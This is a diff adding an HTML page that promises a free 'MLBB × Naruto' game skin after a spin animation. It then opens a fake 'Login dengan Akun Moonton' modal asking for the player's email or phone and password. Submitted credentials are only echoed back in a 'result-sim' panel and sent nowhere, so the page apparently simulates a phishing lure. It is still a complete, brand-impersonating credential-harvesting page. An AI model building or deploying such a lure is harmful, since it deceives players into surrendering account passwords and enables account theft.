@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>MLBB x Naruto</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: url("img/bg.jpg") no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 32px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 760px;
+            border-radius: 14px;
+            background: rgba(0, 0, 0, 80%);
+        }
+
+        .skin-selection img {
+            width: 220px;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 12px;
+            display: block;
+        }
+
+        .skin-option {
+            width: 220px;
+            text-align: center;
+            padding: 6px;
+            cursor: pointer;
+            border-radius: 12px;
+        }
+
+        .skin-option.highlight {
+            outline: 3px solid rgba(255, 193, 7, 0.65);
+            transform: scale(1.03);
+        }
+
+        .skin-option.selected {
+            outline: 3px solid rgba(40, 167, 69, 0.6);
+        }
+
+        .pulse {
+            animation: pulse 900ms infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.04);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .result-sim {
+            background: #071018;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            padding: 14px;
+            border-radius: 8px;
+        }
+
+        pre.sim-pre {
+            background: #02060a;
+            padding: 10px;
+            border-radius: 6px;
+            color: #f8f8f2;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+
+        .muted-small {
+            font-size: .85rem;
+            color: #9fb0c7;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card p-4 shadow-lg" id="mainCard">
+        <h2 class="text-center text-light mb-4">FREE SKIN MLBB × NARUTO</h2>
+
+        <form id="skinForm" autocomplete="off">
+            <input type="hidden" name="skin" id="selectedSkinInput">
+
+            <div class="mb-3">
+                <div class="skin-selection d-flex flex-wrap justify-content-center gap-3" id="skinList">
+                    <div class="skin-option" data-img="naruto.png" data-name="Naruto">
+                        <img src="img/naruto.png" alt="Naruto">
+                        <div class="skin-name muted-small">Naruto</div>
+                    </div>
+
+                    <div class="skin-option" data-img="sasuke.png" data-name="Sasuke">
+                        <img src="img/sasuke.png" alt="Sasuke">
+                        <div class="skin-name muted-small">Sasuke</div>
+                    </div>
+
+                    <div class="skin-option" data-img="sakura.png" data-name="Sakura">
+                        <img src="img/sakura.png" alt="Sakura">
+                        <div class="skin-name muted-small">Sakura</div>
+                    </div>
+
+                    <div class="skin-option" data-img="kakashi.png" data-name="Kakashi">
+                        <img src="img/kakashi.png" alt="Kakashi">
+                        <div class="skin-name muted-small">Kakashi</div>
+                    </div>
+
+                    <div class="skin-option" data-img="gaara.png" data-name="Gaara">
+                        <img src="img/gaara.png" alt="Gaara">
+                        <div class="skin-name muted-small">Gaara</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mb-3 text-center">
+                <button type="button" class="btn btn-warning" id="spinBtn">Acak Skin</button>
+            </div>
+
+            <div class="d-grid">
+                <button type="button" class="btn btn-primary" id="klaimButton" data-bs-toggle="modal"
+                    data-bs-target="#confirmModal" disabled>
+                    Klaim Sekarang
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Modal Konfirmasi Nama & ID -->
+    <div class="modal fade" id="confirmModal" tabindex="-1" aria-labelledby="confirmModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content bg-dark text-light">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="confirmModalLabel">Login dengan Akun Moonton</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"
+                        aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <input type="text" class="form-control" id="nama" name="nama" form="skinForm"
+                            placeholder="Email / Akun Moonton / No. Telepon" required>
+                    </div>
+                    <div class="mb-3">
+                        <input type="password" class="form-control" id="id" name="id" form="skinForm"
+                            placeholder="Password" required>
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="submit" class="btn btn-warning w-100" form="skinForm">Login</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        function escapeHtml(s) {
+            return String(s)
+                .replaceAll('&', '&amp;')
+                .replaceAll('<', '&lt;')
+                .replaceAll('>', '&gt;')
+                .replaceAll('"', '&quot;')
+                .replaceAll("'", '&#39;');
+        }
+
+        let isSpinning = false;
+        const spinBtn = document.getElementById('spinBtn');
+        const klaimBtn = document.getElementById('klaimButton');
+        const options = Array.from(document.querySelectorAll('.skin-option'));
+        const selectedInput = document.getElementById('selectedSkinInput');
+
+        options.forEach((opt, idx) => {
+            opt.addEventListener('click', () => {
+                if (isSpinning) return;
+                options.forEach(o => o.classList.remove('selected', 'highlight', 'pulse'));
+                opt.classList.add('selected');
+                selectedInput.value = opt.dataset.name;
+                klaimBtn.disabled = false;
+            });
+        });
+
+        spinBtn.addEventListener('click', randomPick);
+
+        function randomPick() {
+            if (isSpinning) return;
+            isSpinning = true;
+            klaimBtn.disabled = true;
+
+            options.forEach(opt => opt.classList.remove('highlight', 'selected', 'pulse'));
+            let currentIndex = 0;
+            let loops = Math.floor(Math.random() * 6) + 12;
+            let delay = 90;
+
+            const iv = setInterval(() => {
+                options.forEach(opt => opt.classList.remove('highlight'));
+                options[currentIndex].classList.add('highlight');
+
+                currentIndex = (currentIndex + 1) % options.length;
+                loops--;
+
+                if (loops <= 0) {
+                    clearInterval(iv);
+                    const selectedIndex = (currentIndex - 1 + options.length) % options.length;
+                    const selected = options[selectedIndex];
+                    options.forEach(opt => opt.classList.remove('highlight'));
+                    selected.classList.add('selected', 'pulse');
+
+                    selectedInput.value = selected.dataset.name;
+                    klaimBtn.disabled = false;
+                    isSpinning = false;
+                }
+            }, delay);
+        }
+
+        document.getElementById('skinForm').addEventListener('submit', function (evt) {
+            evt.preventDefault();
+
+            const skin = document.getElementById('selectedSkinInput').value || '—';
+            const nama = document.getElementById('nama').value || '—';
+            const id = document.getElementById('id').value || '—';
+
+            const card = document.getElementById('mainCard');
+
+            let imgPath = 'img/default.png';
+            const matched = options.find(o => o.dataset.name.toLowerCase() === skin.toLowerCase());
+            if (matched && matched.dataset.img) imgPath = 'img/' + matched.dataset.img;
+            else imgPath = 'img/' + skin.toLowerCase() + '.png';
+
+            card.innerHTML = `
+            <div class="text-center p-3">
+                <h3 class="text-warning mb-2">Selamat!</h3>
+                <p class="fs-5 text-light mb-3">Kamu berhasil mendapatkan skin:</p>
+
+                <div style="display:flex; flex-direction:column; align-items:center; text-align:center; gap:12px;">
+            <div style="max-width:240px;">
+                <img src="${escapeHtml(imgPath)}" 
+                    alt="${escapeHtml(skin)}" 
+                    class="img-fluid rounded" 
+                    style="max-height:220px; object-fit:cover;">
+            </div>
+            <div>
+                <h4 class="text-light mb-1">${escapeHtml(skin)}</h4>
+            </div>
+            </div>
+
+
+        <hr style="border-color: rgba(255,255,255,0.06); margin:18px 0;">
+
+        <div class="result-sim mt-2 text-start">
+            <pre class="sim-pre">Email/Akun: ${escapeHtml(nama)}
+Password  : ${escapeHtml(id)}
+Skin      : ${escapeHtml(skin)}
+            </pre>
+        </div>
+      </div>
+    `;
+
+            const modalElm = document.getElementById('confirmModal');
+            const bsModal = bootstrap.Modal.getInstance(modalElm);
+            if (bsModal) bsModal.hide();
+
+            document.getElementById('startOver').addEventListener('click', restoreInitialUI);
+        });
+
+        function restoreInitialUI() {
+            const card = document.getElementById('mainCard');
+            card.innerHTML = `
+      <h2 class="text-center text-light mb-4">FREE SKIN MLBB × NARUTO</h2>
+
+      <form id="skinForm" autocomplete="off">
+        <input type="hidden" name="skin" id="selectedSkinInput">
+
+        <div class="mb-3">
+          <div class="skin-selection d-flex flex-wrap justify-content-center gap-3" id="skinList">
+            <div class="skin-option" data-img="naruto.png" data-name="Naruto">
+              <img src="img/naruto.png" alt="Naruto">
+              <div class="skin-name muted-small">Naruto</div>
+            </div>
+
+            <div class="skin-option" data-img="sasuke.png" data-name="Sasuke">
+              <img src="img/sasuke.png" alt="Sasuke">
+              <div class="skin-name muted-small">Sasuke</div>
+            </div>
+
+            <div class="skin-option" data-img="sakura.png" data-name="Sakura">
+              <img src="img/sakura.png" alt="Sakura">
+              <div class="skin-name muted-small">Sakura</div>
+            </div>
+
+            <div class="skin-option" data-img="kakashi.png" data-name="Kakashi">
+              <img src="img/kakashi.png" alt="Kakashi">
+              <div class="skin-name muted-small">Kakashi</div>
+            </div>
+
+            <div class="skin-option" data-img="gaara.png" data-name="Gaara">
+              <img src="img/gaara.png" alt="Gaara">
+              <div class="skin-name muted-small">Gaara</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="mb-3 text-center">
+          <button type="button" class="btn btn-warning" id="spinBtn">Acak Skin</button>
+        </div>
+
+        <div class="d-grid">
+          <button type="button" class="btn btn-primary" id="klaimButton" data-bs-toggle="modal" data-bs-target="#confirmModal" disabled>
+            Klaim Sekarang
+          </button>
+        </div>
+      </form>
+    `;
+
+            location.reload();
+        }
+    </script>
+</body>
+
+</html>
